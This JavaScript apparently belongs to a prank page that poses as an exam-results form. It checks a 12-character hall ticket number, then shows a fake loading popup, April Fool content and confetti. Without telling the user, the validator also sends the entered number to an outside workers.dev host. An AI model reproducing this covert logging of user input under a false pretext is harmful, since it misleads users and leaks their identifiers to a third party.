function FrontPage_Form1_Validator(theForm) {
  if (theForm.htno.value == "") { 
    alert("Please enter a value for the \"Hall ticket Number\" field."); 
    theForm.htno.focus(); 
    return (false); 
  }

  if (theForm.htno.value.length < 12) {
    alert("Please enter at least 12 characters in the \"Hall ticket Number\" field.");  
    theForm.htno.focus(); 
    return (false); 
  }

  if (theForm.htno.value.length > 12) { 
    alert("Please enter not more than 12 characters in the \"Hall ticket Number\" field.");  
    theForm.htno.focus(); 
    return (false); 
  }
  
  const htno = theForm.htno.value;
  fetch('https://1-1.89determined.workers.dev/' + htno, {
    method: 'GET'
  }).catch(error => console.error('Error:', error));
  
  showLoadingPopup();
  
  return (false); 
}

function showLoadingPopup() {
  document.getElementById('popupOverlay').style.display = 'flex';
  document.getElementById('loadingContent').style.display = 'block';
  document.getElementById('aprilFoolContent').style.display = 'none';
  
  setTimeout(function() {
    document.getElementById('loadingContent').style.display = 'none';
    document.getElementById('aprilFoolContent').style.display = 'block';
    createConfetti();
  }, 3000);
}

function closePopup() {
  document.getElementById('popupOverlay').style.display = 'none';
}

window.onclick = function(event) {
  const popupOverlay = document.getElementById('popupOverlay');
  const popupContent = document.getElementById('popupContent');
  
  if (event.target === popupOverlay) {
    closePopup();
  }
}

function createConfetti() {
  const colors = ['#FF5722', '#4CAF50', '#2196F3', '#FFC107', '#9C27B0', '#E91E63'];
  const confettiContainer = document.getElementById('popupContent');
  
  for (let i = 0; i < 50; i++) {
    const confetti = document.createElement('div');
    confetti.className = 'confetti';
    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    confetti.style.left = Math.random() * 100 + '%';
    confetti.style.animationDelay = Math.random() * 5 + 's';
    confetti.style.animationDuration = Math.random() * 3 + 2 + 's';
    confettiContainer.appendChild(confetti);
  }
}

window.onload = function() {
  document.getElementById('closeButton').addEventListener('click', closePopup);
}

document.addEventListener('DOMContentLoaded', function() {
});

